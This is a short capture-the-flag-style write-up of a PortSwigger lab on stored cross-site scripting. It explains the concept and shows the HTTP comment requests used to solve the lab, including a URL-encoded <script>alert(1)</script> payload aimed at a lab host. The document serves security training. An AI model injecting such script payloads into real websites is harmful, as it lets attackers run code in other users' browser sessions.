# Stored XSS into HTML context with nothing encoded

[Lab in PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

## Definition
Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
```html
<p>This post was extremely helpful.</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
```html
<script>/* Bad stuff here... */</script>
```

Within the attacker's request, this comment would be URL-encoded as:
```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

Any user who visits the blog post will now receive the following within the application's response:
```html
<p><script>/* Bad stuff here... */</script></p>
```

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application. 

## Notes
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 

**Post Comment Request**
```http
POST /post/comment HTTP/1.1
Host: 0ad4001d044971e7c0bf3d1700d7004a.web-security-academy.net
...
Connection: close

csrf=VN3ztoFHeNtLwN8OCLz1s9r2T0BFUcWt&postId=8&comment=comment&name=John+Doe&email=dummy%40mail.com&website=http%3A%2F%2Fwww.bleh.com
```

**XSS Request Payload**
```http
POST /post/comment HTTP/1.1
Host: 0ad4001d044971e7c0bf3d1700d7004a.web-security-academy.net
...
Connection: close

csrf=VN3ztoFHeNtLwN8OCLz1s9r2T0BFUcWt&postId=8&comment=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3b%3c%2f%73%63%72%69%70%74%3e&name=John+Doe&email=dummy%40mail.com&website=http%3A%2F%2Fwww.bleh.com
```

## Key Words
> xss, stored